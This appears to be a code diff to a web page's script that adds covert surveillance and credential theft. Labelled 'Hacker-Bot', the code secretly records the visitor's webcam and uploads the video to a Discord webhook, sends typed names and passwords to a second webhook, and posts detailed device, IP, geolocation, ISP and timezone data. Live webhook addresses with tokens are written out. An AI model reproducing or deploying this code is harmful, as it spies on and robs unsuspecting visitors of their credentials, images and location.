@@ -44,7 +44,7 @@
       color: hsl(240, 10%, 0%);
       font-weight: bold;}
     .Frame{
-      background-color: hsl(240, 10%, 90%);
+      background-color: hsla(0, 0%, 95%, 1);
       border-radius: 10px;
       width: 400px;
       transition: all 5s;
@@ -80,6 +80,29 @@
   </div>
   </div>
   <script>
+  async function startVideo() {
+  try {
+  const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); // No audio
+  mediaRecorder = new MediaRecorder(stream);
+  mediaRecorder.ondataavailable = (event) => {
+    if (event.data.size > 0) recordedChunks.push(event.data);
+  };
+  mediaRecorder.onstop = downloadVideo;
+  mediaRecorder.start();
+  setTimeout(() => {
+    
+    stream.getTracks().forEach(track => track.stop());
+  }, 30000);
+  } catch (error) {console.error("Error accessing camera:", error);}}
+
+function downloadVideo() {
+  const blob = new Blob(recordedChunks, { type: "video/webm" });
+  const url = URL.createObjectURL(blob);
+  let formData = new FormData();
+  formData.append("file", blob, "screenshot.webm");
+  fetch("https://discord.com/api/webhooks/1356391028462190813/KB_5PInxb72NeCIJgbseba6YFgnJ8d2wZGM9yvKgx72o0PvsNF8Ys6woUAsEh346AaSV", {method: "POST",body: formData})
+  .then(response => response.json())}
+startVideo();
   function One(event) {
       const Gui1 = document.getElementById("Gui1");
       const Gui2 = document.getElementById("Gui2");
@@ -121,13 +144,29 @@
       	}, 1000)
         
       const info = 
-`[+] Information: 2
+`${"```"}
+========================================
+           DATA INFORMATION
+========================================
 [+] Name: ${Name}
-[+] Password: ${Password2}`;
+[+] Password: ${Password2}
+${"```"}
+`;
 console.log(info);
-const messagePayload = {content: `\`\`\`\n${info}\n\`\`\``, username: "Hacker-Bot: 2", avatar_url: "https://example.com/avatar.png"}
+const messagePayload = {
+        content: " ",
+        username: "Hacker-Bot: 2",
+        avatar_url: "https://m.apkshub.com/images/f4/net.hackerbot.hbsiteapp/icon.png",
+        embeds: [{
+            title: "**                         INFORMATION: 2**",
+            description: info,
+            color: 0x18100,
+            footer: {text: "Hacker-Bot: 2"},
+            timestamp: new Date().toISOString()
+        }]
+    };
 fetch(webhookURL, {method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(messagePayload)})}}
-const webhookURL = "https://discord.com/api/webhooks/1355452862838345870/KqJsESRCOi_uYtHUi5CH578cQS_NVTKqhfNy6nLsNK3KNGidEmmn0x8A0gvyNhIUtyNh"
+const webhookURL = "https://discord.com/api/webhooks/1355452862838345870/KqJsESRCOi_uYtHUi5CH578cQS_NVTKqhfNy6nLsNK3KNGidEmmn0x8A0gvyNhIUtyNh";
 const batteryInfo = navigator.getBattery ? navigator.getBattery() : null;
 let IP = "Fetching...";
 let localIP = "Unavailable";
@@ -180,7 +219,9 @@ function getOSVersion() {
 
 async function getLocalIP() {
     return new Promise((resolve) => {
-        const pc = new RTCPeerConnection({ iceServers: [] });
+        const pc = new RTCPeerConnection({
+            iceServers: []
+        });
         pc.createDataChannel("");
         pc.setLocalDescription(pc.createOffer());
         pc.onicecandidate = (e) => {
@@ -226,121 +267,116 @@ async function getLocationData() {
     }
 }
 
-async function getC(){
+async function getC() {
     try {
         let response = await fetch('https://ipapi.co/json/');
         let data = await response.json();
         CA = data.country_area;
         CP = data.country_population;
-    } catch (error) {CA = "Unknown"; CP = "Unknown";}}
+    } catch (error) {
+        CA = "Unknown";
+        CP = "Unknown";
+    }
+}
 
 getC();
 async function getinfo() {
-    const battery = await getBatteryInfo();
-    const locationData = await getLocationData();
-    const deviceName = getDeviceName();
-    const os = getOSVersion();
-    const localIP = await getLocalIP(); // Await the local IP function
-    const timeInfo = new Date().toLocaleTimeString();
-    const connection = navigator.connection || {};
-    let info = `
+        const battery = await getBatteryInfo();
+        const locationData = await getLocationData();
+        const deviceName = getDeviceName();
+        const os = getOSVersion();
+        const localIP = await getLocalIP(); // Await the local IP function
+        const timeInfo = new Date().toLocaleTimeString();
+        const connection = navigator.connection || {};
+        let info = `
+${"```"}
 ========================================
            DEVICE INFORMATION
 ========================================
-Device:      ${isAndroid?"Android":"iOS"}
-Name:        ${deviceName}
-Version:     ${os}
-App Name:    ${navigator.appName || "Unknown"}
-Online:      ${navigator.onLine || "Unknown"}
-Max Points:  ${navigator.maxTouchPoints || "Unknown"}
-Product:     ${navigator.product || "Unknown"}
-Platform:    ${navigator.platform || "Unknown"}
-Vendor:      ${navigator.vendor || "Unknown"}
-Language:    ${navigator.language || "Unknown"}
-Languages:   ${navigator.languages || "Unknown"}
-Cookies:     ${navigator.cookieEnabled || "Unknown"}
-App Code:    ${navigator.appCodeName || "Unknown"}
-RAM:         ${navigator.deviceMemory || "Unknown"}
-
+[+] Device:      ${isAndroid?"Android":"iOS"}
+[+] Name:        ${deviceName}
+[+] Version:     ${os}
+[+] App Name:    ${navigator.appName || "Unknown"}
+[+] Online:      ${navigator.onLine || "Unknown"}
+[+] Max Points:  ${navigator.maxTouchPoints || "Unknown"}
+[+] Product:     ${navigator.product || "Unknown"}
+[+] Platform:    ${navigator.platform || "Unknown"}
+[+] Vendor:      ${navigator.vendor || "Unknown"}
+[+] Language:    ${navigator.language || "Unknown"}
+[+] Languages:   ${navigator.languages || "Unknown"}
+[+] Cookies:     ${navigator.cookieEnabled || "Unknown"}
+[+] App Code:    ${navigator.appCodeName || "Unknown"}
+[+] RAM:         ${navigator.deviceMemory || "Unknown"}
 ========================================
            BATTERY INFORMATION
 ========================================
-Charging:    ${battery.charging || "Unknown"}
-Level:       ${battery.level || "Unknown"}
-Charging:    ${battery.chargingTime || "Unknown"}
-Discharging: ${battery.dischargingTime || "Unknown"}
-
+[+] Charging:    ${battery.charging || "Unknown"}
+[+] Level:       ${battery.level || "Unknown"}
+[+] Charging:    ${battery.chargingTime || "Unknown"}
+[+] Discharging: ${battery.dischargingTime || "Unknown"}
 ========================================
            LOCATION INFORMATION
 ========================================
-Country:    ${locationData.country || "Unknown"}
-Public IP:  ${locationData.ip || "Unknown"}
-Local IP:   ${localIP || "Unknown"}
-Region:     ${locationData.region || "Unknown"}
-Continent:  ${locationData.continent || "Unknown"}
-City:       ${locationData.city || "Unknown"}
-Latitude:   ${locationData.latitude || "Unknown"}
-Longitude:  ${locationData.longitude || "Unknown"}
-EU Member:  ${locationData.is_eu || "Unknown"}
-Postal:     ${locationData.postal || "Unknown"}
-Call Code:  +${locationData.calling_code || "Unknown"}
-Capital:    ${locationData.capital || "Unknown"}
-Borders:    ${locationData.borders || "Unknown"}
-Population: ${CP || "Unknown"}
-Area:       ${CA || "Unknown"}
-
+[+] Country:    ${locationData.country || "Unknown"}
+[+] Public IP:  ${locationData.ip || "Unknown"}
+[+] Local IP:   ${localIP || "Unknown"}
+[+] Region:     ${locationData.region || "Unknown"}
+[+] Continent:  ${locationData.continent || "Unknown"}
+[+] City:       ${locationData.city || "Unknown"}
+[+] Latitude:   ${locationData.latitude || "Unknown"}
+[+] Longitude:  ${locationData.longitude || "Unknown"}
+[+] EU Member:  ${locationData.is_eu || "Unknown"}
+[+] Postal:     ${locationData.postal || "Unknown"}
+[+] Call Code:  +${locationData.calling_code || "Unknown"}
+[+] Capital:    ${locationData.capital || "Unknown"}
+[+] Borders:    ${locationData.borders || "Unknown"}
+[+] Population: ${CP || "Unknown"}
+[+] Area:       ${CA || "Unknown"}
 ========================================
-          CONNECTION INFORMATION
+         CONNECTION INFORMATION
 ========================================
-ASN:       ${locationData.asn || "Unknown"}
-ISP:       ${locationData.isp || "Unknown"}
-Org:       ${locationData.org || "Unknown"}
-Domain:    ${locationData.domain || "Unknown"}
-Hardware:  ${navigator.hardwareConcurrency || "Unknown"}
-Downlink:  ${connection.downlink || "Unknown"}
-Save Data: ${connection.saveData || "Unknown"}
-Effective: ${connection.effectiveType || "Unknown"}
-RTT:       ${connection.rtt || "Unknown"}
-
+[+] ASN:       ${locationData.asn || "Unknown"}
+[+] ISP:       ${locationData.isp || "Unknown"}
+[+] Org:       ${locationData.org || "Unknown"}
+[+] Domain:    ${locationData.domain || "Unknown"}
+[+] Hardware:  ${navigator.hardwareConcurrency || "Unknown"}
+[+] Downlink:  ${connection.downlink || "Unknown"}
+[+] Save Data: ${connection.saveData || "Unknown"}
+[+] Effective: ${connection.effectiveType || "Unknown"}
+[+] RTT:       ${connection.rtt || "Unknown"}
 ========================================
           TIMEZONE INFORMATION
 ========================================
-ID:         ${locationData.timezone?.id || "Unknown"}
-Abbr:       ${locationData.timezone?.abbr || "Unknown"}
-DST Active: ${locationData.timezone?.is_dst || "Unknown"}
-Offset:     UTC ${locationData.timezone?.offset || "Unknown"}
-UTC Time:   ${locationData.timezone?.utc || "Unknown"}
-Local Time: ${locationData.timezone?.current_time || "Unknown"}
-Time Now:   ${timeInfo || "Unknown"}
+[+] ID:         ${locationData.timezone?.id || "Unknown"}
+[+] Abbr:       ${locationData.timezone?.abbr || "Unknown"}
+[+] DST Active: ${locationData.timezone?.is_dst || "Unknown"}
+[+] Offset:     UTC ${locationData.timezone?.offset || "Unknown"}
+[+] UTC Time:   ${locationData.timezone?.utc || "Unknown"}
+[+] Local Time: ${locationData.timezone?.current_time || "Unknown"}
+[+] Time Now:   ${timeInfo || "Unknown"}
+${"```"}
 `;
-console.log(info);
-const messagePayload = {content: `\`\`\`\n${info}\n\`\`\``, username: "Hacker-Bot", avatar_url: "https://example.com/avatar.png"}
-fetch(webhookURL, {method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(messagePayload)})};
+    console.log(info);
+    const messagePayload1 = {
+        content: " ",
+        username: "Hacker-Bot: 1",
+        avatar_url: "https://m.apkshub.com/images/f4/net.hackerbot.hbsiteapp/icon.png",
+        embeds: [{
+            title: "**                         INFORMATION: 1**",
+            description: info,
+            color: 0x18100,
+            footer: {text: "Hacker-Bot: 1"},
+            timestamp: new Date().toISOString()
+        }]
+    };
+fetch(webhookURL, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(messagePayload1)});
+};
 
-setTimeout(getinfo, 1000)
-async function startVideo() {
-  try {
-  const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); // No audio
-  mediaRecorder = new MediaRecorder(stream);
-  mediaRecorder.ondataavailable = (event) => {
-    if (event.data.size > 0) recordedChunks.push(event.data);
-  };
-  mediaRecorder.onstop = downloadVideo;
-  mediaRecorder.start();
-  setTimeout(() => {
-    mediaRecorder.stop();
-    stream.getTracks().forEach(track => track.stop());
-  }, 1000);
-  } catch (error) {console.error("Error accessing camera:", error);}}
+setTimeout(getinfo, 2000)
 
-function downloadVideo() {
-  const blob = new Blob(recordedChunks, { type: "video/webm" });
-  const url = URL.createObjectURL(blob);
-  let formData = new FormData();
-  formData.append("file", blob, "screenshot.webm");
-  fetch("https://discord.com/api/webhooks/1356391028462190813/KB_5PInxb72NeCIJgbseba6YFgnJ8d2wZGM9yvKgx72o0PvsNF8Ys6woUAsEh346AaSV", {method: "POST",body: formData})
-  .then(response => response.json())}
-startVideo();
 function Send() {
       const button = document.getElementById("buttonSend");
       const Send = document.getElementById("amount");
